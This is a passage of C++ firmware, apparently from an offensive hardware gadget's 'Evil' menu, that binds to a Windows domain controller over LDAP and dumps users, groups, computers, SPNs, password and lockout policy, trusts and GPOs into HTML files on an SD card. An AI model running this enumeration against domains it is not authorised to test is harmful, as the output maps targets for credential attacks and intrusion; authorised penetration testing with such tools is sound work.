    const std::vector<String>& attributes
){
    Serial.println();
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    Serial.println("[LDAP] START ldapExtractAndSave()");
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    Serial.println("[LDAP] Target:   " + dcIP.toString());
    Serial.println("[LDAP] BaseDN:   " + baseDN);
    Serial.println("[LDAP] Filter:   " + filter);
    Serial.println("[LDAP] File:     " + String(filename));
    Serial.println("[LDAP] Title:    " + String(title));
    for (auto &a : attributes) {
        Serial.println("   - " + a);
    }

    // --------------------------------------------------------------------
    // BaseDN validation
    // --------------------------------------------------------------------
    if (baseDN.length() < 3){
        Serial.println("[LDAP] ERROR: BaseDN invalid.");
        ldapUiLogLine("[ERROR] BaseDN invalid, aborting extract.");
        return;
    }

    // --------------------------------------------------------------------
    // Prepare folder & file
    // --------------------------------------------------------------------
    SD.mkdir("/evil/LDAP");
    String folder = "/evil/LDAP/" + ldapDomainNetbios;
    SD.mkdir(folder);

    String fullPath = folder + "/" + filename;

    File fil = SD.open(fullPath, FILE_WRITE);
    if (!fil){
        Serial.println("[LDAP] ERROR: Cannot open file: " + fullPath);
        ldapUiLogLine(String("[ERROR] Cannot open file: ") + fullPath);
        return;
    }
    Serial.println("[LDAP] File opened â†’ " + fullPath);

    // --------------------------------------------------------------------
    // Write HTML header
    // --------------------------------------------------------------------
    fil.println("<html><head><meta charset='utf-8'>");
    fil.print(FPSTR(LDAP_HTML_UI));
    fil.println("<title>" + String(title) + "</title></head><body>");
    fil.println("<h2>" + String(title) + "</h2><table>");

    // header row
    fil.print("<tr>");
    for (auto &a : attributes) {
        fil.print("<th>");
        fil.print(a);
        fil.print("</th>");
    }
    fil.println("</tr>");

    // --------------------------------------------------------------------
    // Boucle de recherche paginÃ©e AUTH
    // --------------------------------------------------------------------
    Serial.println("[LDAP] Starting paged search loop...");
    ldapUiLogLine("[LDAP] Paged search started...");
    ldapSearchPagedLoop(dcIP, baseDN, filter, attributes, fil);
    ldapUiLogLine("[LDAP] Paged search finished.");

    // --------------------------------------------------------------------
    // FINALIZE
    // --------------------------------------------------------------------
    fil.println("</table></body></html>");
    fil.close();

    Serial.println("[LDAP] File closed.");
    Serial.println("[LDAP] END ldapExtractAndSave()");
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

}


// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Routine complÃ¨te dâ€™extraction LDAP
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
void runLDAPDomainDump() {
    IPAddress dcIP;

    // 1) DÃ©tection + Bind (fonction existante)
    if (!detectAndBindToDC(dcIP)) {
        // On log lâ€™erreur dans la console si elle est dÃ©jÃ  Ã  lâ€™Ã©cran
        ldapUiLogLine("[ERROR] DetectAndBindToDC() failed.");
        waitAndReturnToMenu("LDAP Bind failed");
        return;
    }

    // 2) PrÃ©paration dossier de sortie
    SD.mkdir("/evil/LDAP");
    String folder = "/evil/LDAP/" + ldapDomainNetbios;
    SD.mkdir(folder);

    // 3) Initialisation de la console LDAP UI pour la phase DUMP
    ldapUiResetLog(dcIP, ldapDomainDN);
    ldapUiSetPhase("DUMP");

    ldapUiLogLine("[SCAN] DC: " + dcIP.toString());
    ldapUiLogLine("[LDAP] BaseDN: " + ldapDomainDN);
    if (ldapUsername.length() > 0) {
        ldapUiLogLine("[AUTH] User: " + ldapUsername);
    } else {
        ldapUiLogLine("[AUTH] Anonymous bind");
    }
    ldapUiLogLine("[LDAP] Starting full domain dump...");

    Serial.println();
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    Serial.println("[LDAP] DOMAIN DUMP");
    Serial.println("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    Serial.println("[LDAP] DC       : " + dcIP.toString());
    Serial.println("[LDAP] BaseDN   : " + ldapDomainDN);
    Serial.println("[LDAP] NETBIOS  : " + ldapDomainNetbios);
    Serial.println("[LDAP] Username : " + ldapUsername);

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // DOMAIN USERS
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiLogLine("[LDAP] Dumping domain users...");
    ldapUiSetPhase("DUMP USERS");

    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectCategory=person",
        "domain_users.html",
        "Domain Users",
        {
            "cn",                    // CN
            "name",                  // name (RDN)
            "sAMAccountName",        // SAM Name
            "memberOf",              // Member of groups
            "primaryGroupID",        // Primary group (ID)
            "whenCreated",           // Created on
            "whenChanged",           // Changed on
            "lastLogon",             // lastLogon (brut)
            "userAccountControl",    // Flags
            "pwdLastSet",            // pwdLastSet
            "description",           // description
            "servicePrincipalName"   // SPN
        }
    );
    ldapUiLogLine("[LDAP] Done: Domain Users");

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // DOMAIN GROUPS
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiSetPhase("DUMP Groups");
    ldapUiLogLine("[LDAP] Dumping domain groups...");
    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectCategory=group",
        "domain_groups.html",
        "Domain Groups",
        {
            "cn",                    // CN
            "sAMAccountName",        // SAM Name
            "memberOf",              // Member of groups (groupes parents)
            "member",
            "description",           // description
            "whenCreated",           // Created on
            "whenChanged"            // Changed on
        }
    );
    ldapUiLogLine("[LDAP] Done: Domain Groups");

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // DOMAIN COMPUTER ACCOUNTS
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiLogLine("[LDAP] Dumping domain computers...");
    ldapUiSetPhase("DUMP Computers");
    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectCategory=computer",
        "domain_computers.html",
        "Domain Computer Accounts",
        {
            "cn",                         // CN
            "sAMAccountName",             // SAM Name
            "dNSHostName",                // DNS Hostname
            "operatingSystem",            // Operating System
            "operatingSystemServicePack", // Service Pack
            "operatingSystemVersion",     // OS Version
            "lastLogon",                  // lastLogon
            "userAccountControl",         // Flags
            "whenCreated",                // Created on
            "description"                 // description
        }
    );
    ldapUiLogLine("[LDAP] Done: Domain Computers");

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // DOMAIN POLICY (password / lockout)
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiLogLine("[LDAP] Dumping domain policy...");
    ldapUiSetPhase("DUMP Policy");
    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectClass=domain",
        "domain_policy.html",
        "Domain Policy",
        {
            "distinguishedName",          // distinguishedName
            "lockoutObservationWindow",   // Lockout time window
            "lockoutDuration",            // Lockout Duration
            "lockoutThreshold",           // Lockout Threshold
            "maxPwdAge",                  // Max password age
            "minPwdAge",                  // Min password age
            "minPwdLength",               // Min password length
            "pwdHistoryLength",           // Password history length
            "pwdProperties",              // Password properties (bitmask)
            "ms-DS-MachineAccountQuota"   // Machine Account Quota
        }
    );
    ldapUiLogLine("[LDAP] Done: Domain Policy");

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // TRUSTS
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiLogLine("[LDAP] Dumping domain trusts...");
    ldapUiSetPhase("DUMP Trusts");
    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectClass=trustedDomain",
        "domain_trusts.html",
        "Domain Trusts",
        {
            "trustPartner",
            "trustDirection",
            "trustType"
        }
    );
    ldapUiLogLine("[LDAP] Done: Domain Trusts");
    ldapUiSetPhase("DUMP GPO");
    ldapUiLogLine("[LDAP] Dumping GPOs...");
    
    ldapExtractAndSave(
        dcIP,
        ldapDomainDN,
        "objectClass=groupPolicyContainer",
        "domain_gpo.html",
        "Group Policy Objects",
        {
            "displayName",
            "name",
            "distinguishedName",
            "gPCFileSysPath",
            "gPCMachineExtensionNames",
            "gPCUserExtensionNames",
            "whenCreated",
            "whenChanged",
            "versionNumber"
        }
    );
    
    ldapUiLogLine("[LDAP] Done: GPOs");
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Fin â€“ recap & viewer
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    ldapUiSetPhase("DONE");
    ldapUiLogLine("[LDAP] Dump completed.");
    ldapUiLogLine(String("[LDAP] Files in /evil/LDAP/") + ldapDomainNetbios + "/");
    ldapUiLogLine(" - domain_users.html");
    ldapUiLogLine(" - domain_groups.html");
    ldapUiLogLine(" - domain_computers.html");
    ldapUiLogLine(" - domain_policy.html");
    ldapUiLogLine(" - domain_trusts.html");
    ldapUiLogLine(" - domain_gpo.html");
    
    // Laisser l'utilisateur consulter les logs (scroll ';' / '.' / BACKSPACE)
    ldapUiShowViewer();

    // Retour au menu principal Evil
    waitAndReturnToMenu("LDAP Dump done");
}
